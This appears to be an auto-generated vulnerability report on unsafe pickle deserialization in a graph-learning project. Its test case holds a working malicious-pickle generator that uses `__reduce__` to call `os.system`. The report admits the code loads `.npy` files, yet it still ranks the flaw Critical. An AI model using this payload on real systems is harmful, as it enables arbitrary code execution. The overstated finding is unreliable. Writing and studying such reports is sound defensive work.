### Vulnerability List

- Vulnerability Name: Unsafe Deserialization of Pickle Files
- Description:
    - The project is vulnerable to arbitrary code execution through unsafe deserialization of pickle files.
    - The `README.md` file, under section "2.2 Prepare Your Own Data", suggests that users can provide data in the form of `adjs.pickle`. This implies that the application might be designed to load graph data from pickle files.
    - Pickle is a Python serialization format that is known to be unsafe when loading data from untrusted sources. It allows for arbitrary code execution during deserialization.
    - An attacker can craft a malicious pickle file (e.g., `adjs.pickle`) containing embedded malicious code.
    - If a user is tricked into using this malicious pickle file as input to the application, the `pickle.load` function, if used in the application, will execute the attacker's code during the deserialization process.
- Impact:
    - Critical: Arbitrary code execution.
    - Successful exploitation allows the attacker to execute arbitrary Python code on the machine running the application.
    - This can lead to a wide range of severe security consequences, including:
        - Complete control over the compromised system.
        - Data breaches and exfiltration of sensitive information.
        - Installation of malware, backdoors, or ransomware.
        - Denial of service.
        - Lateral movement within a network.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None: The provided project files do not include any mitigations against unsafe pickle deserialization. There is no input validation or sanitization related to pickle files in the provided code.
- Missing Mitigations:
    - Avoid Deserializing Pickle Files from Untrusted Sources: The most effective mitigation is to avoid using pickle to load data from sources that cannot be fully trusted.
    - Use Safe Serialization Formats: Replace pickle with safer serialization formats like JSON, MessagePack, or Protocol Buffers, which do not inherently allow arbitrary code execution during deserialization.
    - Input Validation and Sanitization (Ineffective for Pickle): While generally good security practices, input validation and sanitization are not effective against pickle deserialization vulnerabilities because the vulnerability lies in the deserialization process itself, not in the content of the data being deserialized in a traditional sense.
- Preconditions:
    1. The application must be designed to load graph data from pickle files, specifically `adjs.pickle` as suggested in the `README.md`.
    2. An attacker needs to be able to provide or convince a user to use a malicious pickle file as input to the application. This could be achieved through social engineering, supply chain attacks, or by compromising a data source used by the application.
- Source Code Analysis:
    - `File: /code/README.md`: The README explicitly mentions `adjs.pickle` under "2.2 Prepare Your Own Data", indicating the potential use of pickle files for adjacency data.
    - `File: /code/Model/utils.py`: The provided `load_data` function in `Model/utils.py` currently loads `.npy` files using `np.load`. However, the README's mention of `.pickle` files suggests a discrepancy or a potential configuration where pickle files are expected. If the project were to load `adjs.pickle` as implied by the README, a `pickle.load()` operation would be necessary, which is the source of the vulnerability.

    ```python
    # Hypothetical vulnerable code (if pickle loading were implemented based on README):
    import pickle

    def load_adj_pickle(file_adj): # Hypothetical function to load pickle
        with open(file_adj, 'rb') as f:
            adj_d = pickle.load(f) # Unsafe deserialization of pickle file
        adj_read = []
        for item in adj_d: # Assuming pickle structure similar to npy
            num_nodes = item["num_nodes"]
            indptr = item['indptr']
            indices = item['indices']
            weights = item['weights']
            assert num_nodes == len(indptr) - 1
            adj = sp.csr_matrix((weights, indices, indptr), shape=[num_nodes, num_nodes])
            adj_read.append(adj)
        return adj_read

    def load_data(dataDir):
        files = [dataDir + item for item in ["/adjs.pickle", "/feats.npy", "/nodes.npy", ...]] # Modified to load pickle
        [file_adj, file_feat, file_node, file_user, file_query, file_asin, file_query_gt, file_asin_gt, file_kg] = files
        adj = load_adj_pickle(file_adj) # Hypothetical pickle loading function used
        ...
    ```
    - In the hypothetical code above, if `load_adj_pickle` were used to load `adjs.pickle`, any malicious pickle file provided as `file_adj` would lead to arbitrary code execution when `pickle.load(f)` is called.

- Security Test Case:
    1. **Prepare a Malicious Pickle File:**
        - Create a Python script (e.g., `malicious_pickle_gen.py`) to generate a malicious pickle file named `adjs.pickle`. This script will embed code to create a file `/tmp/pwned` as a proof of concept for arbitrary code execution.

        ```python
        # malicious_pickle_gen.py
        import pickle
        import os
        import numpy as np

        class Exploit:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pwned',)) # Malicious payload: creates /tmp/pwned

        data = [{ # Structure mimicking expected data based on load_adj and npy files
            'num_nodes': 2,
            'indptr': np.array([0, 2, 3], dtype=np.int64),
            'indices': np.array([1, 0, 1], dtype=np.int64),
            'weights': np.array([1.0, 1.0, 1.0], dtype=np.float32)
        }, Exploit()] # Injecting malicious object

        with open('adjs.pickle', 'wb') as f:
            pickle.dump(data, f)
        ```

    2. **Replace Data File:**
        - Navigate to the data directory specified in `train.py` (e.g., `../PreProcess/elec/`).
        - Replace the existing `adjs.npy` (or rename it for backup) with the generated `adjs.pickle` file.
        - If a data directory doesn't exist, create it and place `adjs.pickle` inside, along with other necessary data files as per README, but for this test, focusing on `adjs.pickle` is sufficient.

    3. **Run the Training Script:**
        - Execute the `train.py` script from the command line, as described in the "3.0 Usage" section of the `README.md`. For example:
        ```bash
        python code/train.py --data_name elec --data_dir ../PreProcess/
        ```

    4. **Check for Code Execution:**
        - After running the script, check if the file `/tmp/pwned` has been created on the system.
        - If `/tmp/pwned` exists, it confirms that the malicious code embedded in `adjs.pickle` was executed during the data loading process, demonstrating the arbitrary code execution vulnerability.

**Note:** This security test case assumes that the application is modified or intended to load pickle files as suggested by the README. If the application strictly uses `np.load` for `.npy` files as in the provided `Model/utils.py`, this specific pickle vulnerability as described might not be directly exploitable in the current codebase. However, the discrepancy between the README and the code still highlights a potential misconfiguration or intended insecure functionality that should be addressed. The README should be corrected, or the code should be updated to handle pickle files securely or avoid them altogether, if that was the original intention.